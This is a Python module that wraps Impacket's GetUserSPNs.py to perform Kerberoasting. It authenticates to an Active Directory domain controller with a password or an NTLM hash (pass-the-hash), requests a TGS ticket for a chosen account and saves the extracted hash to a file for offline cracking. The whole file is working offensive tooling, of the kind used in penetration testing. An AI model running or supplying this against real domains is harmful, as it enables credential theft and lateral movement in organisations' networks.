"""
Impacket Runner — Subprocess wrapper for GetUserSPNs.py

Builds and executes Impacket commands for single-target
TGS ticket requests with password or pass-the-hash auth.
"""

import subprocess
from typing import List


class ImpacketRunner:
    """Execute Impacket GetUserSPNs.py for targeted TGS requests."""

    def __init__(
        self,
        domain: str,
        username: str,
        password: str = "",
        dc_ip: str = "",
        ntlm_hash: str = "",
    ):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.ntlm_hash = ntlm_hash

    def request_tgs(self, target_user: str, output_file: str) -> str:
        """
        Request a TGS ticket for a single user via GetUserSPNs.py.

        Returns the output file path on success, empty string on failure.
        """
        cmd = self._build_command(target_user, output_file)

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                print(f"[+] Hash extracted → {output_file}")
                return output_file
            else:
                error = result.stderr[:200] if result.stderr else "Unknown"
                print(f"[-] Failed: {error}")
                return ""
        except FileNotFoundError:
            print("[-] GetUserSPNs.py not found — install Impacket")
            return ""
        except Exception as e:
            print(f"[-] Error: {e}")
            return ""

    def _build_command(self, target_user: str, output_file: str) -> List[str]:
        """Build the GetUserSPNs.py command for a single target."""
        cmd = ["GetUserSPNs.py"]

        if self.ntlm_hash:
            cmd += [
                f"{self.domain}/{self.username}",
                "-hashes", f":{self.ntlm_hash}",
            ]
        else:
            cmd += [f"{self.domain}/{self.username}:{self.password}"]

        cmd += [
            "-dc-ip", self.dc_ip,
            "-request-user", target_user,
            "-outputfile", output_file,
        ]
        return cmd